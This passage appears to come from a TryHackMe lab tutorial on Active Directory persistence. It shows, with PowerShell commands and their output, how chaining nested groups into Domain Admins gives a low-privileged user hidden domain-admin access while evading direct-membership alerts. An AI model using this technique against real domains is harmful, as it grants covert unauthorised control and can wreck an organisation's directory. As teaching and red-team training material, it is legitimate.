If we don't want to tamper with SID histories, we can just add ourselves directly to AD groups for persistence. While SID history is a great persistence technique, credential rotation and cleanup can still remove our persistence. In certain cases, it may be better to perform persistence by targeting the AD groups themselves.

While privileged accounts or groups like Domain Admins and Enterprise Admins provide significant power, they are also heavily monitored and scrutinized. To persist undetected, it’s often more effective to target less-obvious groups that still offer useful privileges:

- **IT Support Groups**: Membership in these groups can allow actions like forcing password changes. While privileged accounts may be off-limits for resets, gaining control over low-privileged accounts can help spread access across workstations.
- **Groups with Local Administrator Rights**: These groups are generally less monitored than protected groups. By targeting a network support group that grants local admin rights to key hosts, you can establish persistence with access that may later be leveraged to re-compromise the domain.
- **Groups with Indirect Privileges**: Sometimes, groups that control specific resources, like ownership of Group Policy Objects (GPOs), can be just as effective. Manipulating GPOs can provide indirect but powerful control over the environment.


## Nested Groups
In many organizations, there are **recursive groups**, meaning a group is a member of another group. This is called **group nesting**, and it helps organize Active Directory (AD). For example, the "IT Support" group might include subgroups like "Helpdesk," "Access Card Managers," and "Network Managers." These subgroups are added as members of "IT Support," so all users in the subgroups inherit the permissions of "IT Support." At the same time, the subgroups can have their own specific permissions.

While group nesting keeps AD organized, it can hide **who has access to what**. For example, if you check the members of "IT Support," you might only see the three subgroups, not the actual users. To find the real number of users, you'd need to check each subgroup—and any subgroups inside them. This can make it harder to track access accurately.

This also affects monitoring. Imagine you have an alert that triggers when someone is added to the "Domain Admins" group. If someone adds a user to a subgroup within "Domain Admins," the alert won’t fire because it’s only tracking direct changes. This happens often due to miscommunication between the AD team and the InfoSec team.

Attackers can exploit this reduced visibility. Instead of adding themselves to a highly monitored group like "Domain Admins," they add themselves to a subgroup, avoiding detection. This gives them the same access but without raising any alerts.

## Nesting Our Persistence 
Let's simulate this type of persistence. In order to allow other users also to perform the technique, make sure to prepend your username to all the groups that you create. In order to simulate the persistence, we will create some of our own groups.

Let's start by creating a new base group that we will hide in the People->IT Organisational Unit (OU):
```markup
PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "{username} Net Group 1" -SamAccountName "{username}_nestgroup1" -DisplayName "{username} Nest Group 1" -GroupScope Global -GroupCategory Security
```

Let's now create another group in the People->Sales OU and add our previous group as a member:
```markup
PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "{username} Net Group 2" -SamAccountName "{username}_nestgroup2" -DisplayName "{username} Nest Group 2" -GroupScope Global -GroupCategory Security 

PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "{username}_nestgroup2" -Members "{username}_nestgroup1"
```

We can do this a couple more times, every time adding the previous group as a member:
```markup
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security

PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"

PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security

PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"

PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security

PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4
```

With the last group, let's now add that group to the Domain Admins group:
```markup
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "{username}_nestgroup5"
```

Lastly, let's add our low-privileged AD user to the first group we created:
```markup
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "{low privileged username}"
```

Instantly, your low-privileged user should now have privileged access to THMDC. Let's verify this by using our SSH terminal on THMWRK1:
```markup
za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\thmdc.za.tryhackme.loc\c$\ 
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows 
 Volume Serial Number is 1634-22A9

 Directory of \\thmdc.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1     
05/01/2022  09:11 AM               169 dns_entries.csv
09/15/2018  08:19 AM    <DIR>          PerfLogs
05/11/2022  10:32 AM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
05/01/2022  09:17 AM             1,725 thm-network-setup-dc.ps1    
04/25/2022  07:13 PM    <DIR>          tmp
05/15/2022  09:16 PM    <DIR>          Tools
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant] 
04/27/2022  08:12 PM    <DIR>          Windows
               3 File(s)          1,997 bytes
               8 Dir(s)  51,573,755,904 bytes free
```

Let's also verify that even though we created multiple groups, the Domain Admins group only has one new member:
```markup
PS C:\Users\Administrator.ZA> Get-ADGroupMember -Identity "Domain Admins"


distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc
name              : Administrator
objectClass       : user
objectGUID        : 0bbd7980-b53b-4634-8a28-57e4234655c2
SamAccountName    : Administrator
SID               : S-1-5-21-3885271727-2693558621-2658995185-500

distinguishedName : CN=Am0 Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc
name              : Am0 Net Group 5
objectClass       : group
objectGUID        : ba545574-6af9-4a3d-a8df-24ab582fc04c
SamAccountName    : am0_nestgroup5
SID               : S-1-5-21-3885271727-2693558621-2658995185-6163
```

**Annoying More Than Just The Blue Team**  
If this was a real organisation, we would not be creating new groups to nest. Instead, we would make use of the existing groups to perform nesting. However, this is something you would never do on a normal red team assessment and almost always dechain at this point since it breaks the organisation's AD structure, and if we sufficiently break it, they would not be able to recover. At this point, even if the blue team was able to kick us out, the organisation would more than likely still have to rebuild their entire AD structure from scratch, resulting in significant damages.